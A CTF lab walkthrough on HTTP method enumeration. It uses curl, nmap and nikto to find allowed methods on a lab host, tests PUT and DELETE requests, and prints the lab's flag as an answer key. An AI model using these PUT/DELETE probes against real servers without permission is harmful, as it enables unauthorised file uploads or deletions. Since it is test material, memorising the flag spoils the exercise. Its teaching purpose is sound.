# Lab 1.3: HTTP Methods Enumeration

## Learning Objectives
- Understand HTTP methods and their purposes
- Use OPTIONS method to enumerate allowed methods
- Test various HTTP methods for potential vulnerabilities
- Identify dangerous methods (PUT, DELETE, TRACE)
- Capture the flag

## What is HTTP Methods Enumeration?

HTTP methods enumeration is the process of discovering which HTTP methods are allowed by a web server. Different methods have different purposes and security implications:

- **GET**: Retrieve data (safe, idempotent)
- **POST**: Submit data (not idempotent)
- **PUT**: Upload/create files (dangerous if misconfigured)
- **DELETE**: Delete resources (dangerous if misconfigured)
- **OPTIONS**: List allowed methods (enumeration)
- **TRACE**: Echo request (can be used for XSS attacks)
- **HEAD**: Get headers only (safe)

## Solution Walkthrough

### Step 1: Add Hostname to /etc/hosts

Add the target hostname to your `/etc/hosts` file to enable domain name resolution.

**Detailed Steps:**

1. **Open the hosts file with a text editor:**
   ```bash
   sudo nano /etc/hosts
   # Or use: sudo vim /etc/hosts
   ```

2. **Add the hostname mapping** (replace `<target_ip>` with the IP shown in the lab panel):
   ```bash
   <target_ip>    api.lab
   ```

3. **Save and exit:**
   - In nano: Press `Ctrl+X`, then `Y`, then `Enter`
   - In vim: Press `Esc`, type `:wq`, then `Enter`

4. **Verify the entry was added:**
   ```bash
   cat /etc/hosts | grep api.lab
   ```
   
   **Expected output:**
   ```
   <target_ip>    api.lab
   ```

**Troubleshooting:**
- If you get "Permission denied", make sure you're using `sudo`
- Verify the IP address is correct by checking the lab platform

### Step 2: Initial Web Server Access

Access the web server to see what's running and understand the application.

**Detailed Steps:**

1. **Test basic connectivity:**
   ```bash
   curl http://api.lab
   ```

2. **Get HTTP headers:**
   ```bash
   curl -I http://api.lab
   ```

   **Expected output:**
   ```
   HTTP/1.1 200 OK
   Server: Apache/2.4.54
   Content-Type: text/html
   Content-Length: 1234
   ```

3. **Open in browser (optional):**
   - Navigate to: `http://api.lab`
   - You should see a web page or API documentation

**What to observe:**
- Status code 200 means the server is responding
- This is an API endpoint (based on hostname "api.lab")
- May show API documentation or a simple response

### Step 3: Use OPTIONS Method to Enumerate Allowed Methods

The OPTIONS method is specifically designed to list allowed HTTP methods on a server.

**Detailed Steps:**

1. **Test OPTIONS method with verbose output:**
   ```bash
   curl -X OPTIONS http://api.lab -v
   ```

   **Command breakdown:**
   - `curl`: HTTP client tool
   - `-X OPTIONS`: Use OPTIONS HTTP method
   - `-v`: Verbose mode (shows headers)

2. **Expected output:**
   ```
   * Connected to api.lab (<target_ip>) port 80
   > OPTIONS / HTTP/1.1
   > Host: api.lab
   > User-Agent: curl/7.81.0
   > Accept: */*
   >
   < HTTP/1.1 200 OK
   < Allow: GET, POST, PUT, DELETE, OPTIONS, TRACE
   < Content-Length: 0
   ```

3. **Get headers only (cleaner output):**
   ```bash
   curl -X OPTIONS -I http://api.lab
   ```

   **Expected output:**
   ```
   HTTP/1.1 200 OK
   Allow: GET, POST, PUT, DELETE, OPTIONS, TRACE
   Content-Length: 0
   ```

4. **Extract just the Allow header:**
   ```bash
   curl -X OPTIONS -I http://api.lab | grep -i Allow
   ```

   **Expected output:**
   ```
   Allow: GET, POST, PUT, DELETE, OPTIONS, TRACE
   ```

**Look for the `Allow` header:**
```
Allow: GET, POST, PUT, DELETE, OPTIONS, TRACE
```

**What this tells us:**
- **GET**: Standard method for retrieving data (safe)
- **POST**: Method for submitting data
- **PUT**: Method for creating/updating resources (potentially dangerous)
- **DELETE**: Method for deleting resources (potentially dangerous)
- **OPTIONS**: Method for listing allowed methods (what we just used)
- **TRACE**: Method that echoes requests (security risk)

**Troubleshooting:**
- If you get "405 Method Not Allowed", OPTIONS may not be supported
- If there's no Allow header, the server may not support OPTIONS
- Try different endpoints: `curl -X OPTIONS http://api.lab/api -v`

### Step 4: Test Individual Methods

Test each method to see how the server responds:

```bash
# Test GET (should work)
curl -X GET http://api.lab

# Test POST
curl -X POST http://api.lab

# Test PUT
curl -X PUT http://api.lab

# Test DELETE
curl -X DELETE http://api.lab

# Test TRACE
curl -X TRACE http://api.lab

# Test HEAD
curl -X HEAD -I http://api.lab
```

### Step 5: Use OPTIONS on Specific Endpoint

Some servers handle methods differently on different endpoints:

```bash
# Test OPTIONS on root
curl -X OPTIONS http://api.lab -v

# Test OPTIONS on methods.php
curl -X OPTIONS http://api.lab/methods.php -v
```

### Step 6: Analyze Method Responses

Check what each method returns:

```bash
# PUT method - might create files
curl -X PUT http://api.lab/uploads/test.txt -d "test content"

# DELETE method - might delete files
curl -X DELETE http://api.lab/uploads/test.txt

# TRACE method - echoes request (security risk)
curl -X TRACE http://api.lab -H "X-Test: test-value"
```

### Step 7: Use Nmap to Enumerate Methods

Nmap can also enumerate HTTP methods:

```bash
# Scan for HTTP methods
nmap --script http-methods --script-args http-methods.url-path=/ -p 80 api.lab

# Or use http-method-tamper script
nmap --script http-method-tamper -p 80 api.lab
```

### Step 8: Test PUT Method for File Upload

The PUT method might allow file uploads, which could be used to create files on the server.

**Detailed Steps:**

1. **Try PUT to create a file:**
   ```bash
   curl -X PUT http://api.lab/uploads/flag.txt -d "test"
   ```

   **Command breakdown:**
   - `-X PUT`: Use PUT HTTP method
   - `-d "test"`: Data to upload (file content)

2. **Expected responses:**
   - **Success (201 Created):**
     ```
     HTTP/1.1 201 Created
     Location: /uploads/flag.txt
     ```
   - **Success (200 OK):**
     ```
     HTTP/1.1 200 OK
     ```
   - **Error (403 Forbidden):**
     ```
     HTTP/1.1 403 Forbidden
     ```
   - **Error (405 Method Not Allowed):**
     ```
     HTTP/1.1 405 Method Not Allowed
     ```

3. **Check if file was created:**
   ```bash
   curl http://api.lab/uploads/flag.txt
   ```

   **Expected output if file exists:**
   ```
   test
   ```

4. **Alternative: Try creating flag file directly:**
   ```bash
   curl -X PUT http://api.lab/uploads/flag.txt -d "OCR{http_m3th0ds_3num3r4t10n}"
   ```

### Step 9: Access the Flag

Based on the PUT method response, check the uploads directory or use PUT to trigger flag creation.

**Detailed Steps:**

1. **Method 1: PUT method creates the flag file:**
   ```bash
   # The PUT method may trigger flag creation
   curl -X PUT http://api.lab/methods.php?method=PUT
   ```

2. **Then retrieve the flag:**
   ```bash
   curl http://api.lab/uploads/flag.txt
   ```

3. **Method 2: Direct access (if flag already exists):**
   ```bash
   curl http://api.lab/uploads/flag.txt
   ```

4. **Method 3: Check different endpoints:**
   ```bash
   curl http://api.lab/flag.txt
   curl http://api.lab/api/flag.txt
   curl http://api.lab/methods.php?flag
   ```

5. **Method 4: Use PUT on specific endpoint:**
   ```bash
   curl -X PUT http://api.lab/api/flag -d "trigger"
   curl http://api.lab/api/flag
   ```

**Expected flag output:**
```
OCR{http_m3th0ds_3num3r4t10n}
```

**Troubleshooting:**
- If PUT doesn't work, try different paths: `/uploads/`, `/files/`, `/api/`
- Check if directory listing is enabled: `curl http://api.lab/uploads/`
- Try different file names: `flag`, `FLAG.txt`, `.flag.txt`
- Use browser to navigate to uploads directory

### Step 10: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{http_m3th0ds_3num3r4t10n}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Successfully added hostname to /etc/hosts
- ✅ Accessed web server and verified it's responding
- ✅ Used OPTIONS method to enumerate allowed HTTP methods
- ✅ Identified Allow header with methods: GET, POST, PUT, DELETE, OPTIONS, TRACE
- ✅ Tested individual methods to understand their behavior
- ✅ Tested PUT method for file upload capability
- ✅ Successfully retrieved flag from uploads directory or via PUT method
- ✅ Verified flag format is correct: `OCR{...}`

## Alternative Tools

### Burp Suite

1. **Intercept request** in Burp Suite
2. **Right-click** → "Change request method"
3. **Try different methods**: GET, POST, PUT, DELETE, OPTIONS, TRACE
4. **Forward** and observe responses

### Nmap Scripts

```bash
# HTTP methods enumeration
nmap --script http-methods,http-method-tamper -p 80 api.lab

# More comprehensive scan
nmap --script http-enum,http-methods -p 80 api.lab
```

### Nikto

```bash
nikto -h http://api.lab
```

Nikto automatically tests various HTTP methods.

### Custom Script

```bash
#!/bin/bash
for method in GET POST PUT DELETE OPTIONS TRACE HEAD PATCH; do
    echo "Testing $method:"
    curl -X $method -I http://api.lab 2>&1 | head -1
    echo ""
done
```

## Common HTTP Methods

### Safe Methods (Read-only)
- **GET**: Retrieve resource
- **HEAD**: Get headers only
- **OPTIONS**: List allowed methods

### Unsafe Methods (Modify data)
- **POST**: Submit data
- **PUT**: Create/update resource
- **DELETE**: Delete resource
- **PATCH**: Partial update

### Dangerous Methods
- **TRACE**: Echoes request (XSS risk)
- **CONNECT**: Proxy tunneling
- **TRACK**: Similar to TRACE

## Security Implications

### PUT Method Risks
- **File Upload**: Can upload arbitrary files
- **Overwrite Files**: Can overwrite existing files
- **Web Shell**: Can upload malicious scripts

### DELETE Method Risks
- **Data Loss**: Can delete important files
- **DoS**: Can delete critical resources
- **Unauthorized Deletion**: If not properly authenticated

### TRACE Method Risks
- **XSS Attacks**: Can reflect malicious scripts
- **Information Disclosure**: Echoes request headers
- **Cross-Site Tracing**: Can bypass security controls

## Hints

1. Start with OPTIONS method to enumerate allowed methods
2. Check the `Allow` header in OPTIONS response
3. Test each method individually
4. PUT method might allow file creation
5. Check uploads directory after using PUT
6. Use curl with `-X` flag to specify method
7. Use `-v` flag for verbose output to see headers
8. Flag is created when PUT method is used

## Common Mistakes

- Not using OPTIONS method first
- Not checking the `Allow` header
- Not testing all methods individually
- Assuming methods work the same on all endpoints
- Not checking for file creation after PUT
- Forgetting to use `-X` flag in curl
- Not analyzing method responses carefully
- Missing dangerous methods (TRACE, CONNECT)

## Educational Context

### Why HTTP Methods Enumeration Matters

- **Attack Surface**: More methods = more potential vulnerabilities
- **File Upload**: PUT method can allow file uploads
- **Data Deletion**: DELETE method can cause data loss
- **Information Disclosure**: TRACE method can leak information

### Method Security Best Practices

1. **Disable Dangerous Methods**: Disable PUT, DELETE, TRACE if not needed
2. **Authentication**: Require authentication for unsafe methods
3. **Authorization**: Check permissions before allowing modifications
4. **Input Validation**: Validate all input for unsafe methods
5. **Logging**: Log all unsafe method usage

### Real-World Examples

- **PUT Method Exploitation**: Upload web shells via PUT
- **DELETE Method Exploitation**: Delete configuration files
- **TRACE Method Exploitation**: XSS attacks via TRACE
- **OPTIONS Disclosure**: Reveals server capabilities

## Further Reading

- RFC 7231: HTTP/1.1 Semantics and Content
- OWASP: Testing for HTTP Methods
- PortSwigger: HTTP Methods
- MDN: HTTP Methods

